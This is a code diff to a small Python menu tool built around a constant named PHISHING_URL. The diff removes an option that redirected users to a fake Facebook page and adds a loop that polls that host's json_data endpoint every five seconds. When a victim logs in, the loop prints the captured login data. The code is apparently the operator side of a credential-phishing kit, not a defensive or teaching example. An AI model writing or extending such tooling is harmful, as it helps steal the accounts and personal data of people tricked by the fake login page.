@@ -1,6 +1,7 @@
 from colorama import Fore, Style
 import os
 import time
+import requests
 
 # Constants
 PHISHING_URL = "https://demo-coding.vercel.app"
@@ -44,12 +45,27 @@ def show_disclaimer():
 # Menu Display
 def show_menu():
     print(Style.BRIGHT + Fore.GREEN + "\n[ MAIN MENU ]" + Style.RESET_ALL)
-    print(Fore.MAGENTA + "1. Facebook ")
+    print(Fore.MAGENTA + "1. Start Polling for Live Data")
     print("2. Exit" + Style.RESET_ALL)
 
-# Option: Open Phishing Page
-def open_facebook():
-    print(Fore.YELLOW + f"\nRedirecting to: {PHISHING_URL}" + Style.RESET_ALL)
+# Polling Functionality for Live Data
+def start_polling():
+    print(Fore.YELLOW + "\nPolling for live data... Press Ctrl+C to stop." + Style.RESET_ALL)
+    try:
+        while True:
+            # Fetch live data from the endpoint
+            response = requests.get(f"{PHISHING_URL}/json_data")
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("login_status") == "logged_in":  # Replace with your API's login condition
+                    print(Fore.GREEN + f"User logged in! Data: {data}" + Style.RESET_ALL)
+                else:
+                    print(Fore.CYAN + "No login detected. Waiting..." + Style.RESET_ALL)
+            else:
+                print(Fore.RED + f"Failed to fetch data. HTTP Status: {response.status_code}" + Style.RESET_ALL)
+            time.sleep(5)  # Wait 5 seconds before polling again
+    except KeyboardInterrupt:
+        print(Fore.GREEN + "\nStopping polling and exiting to the main menu." + Style.RESET_ALL)
 
 # Exit Program
 def exit_tool():
@@ -67,8 +83,7 @@ def main():
         show_menu()
         choice = input(Fore.CYAN + "\nEnter your choice: " + Style.RESET_ALL)
         if choice == "1":
-            open_facebook()
-        
+            start_polling()
         elif choice == "2":
             exit_tool()
         else:
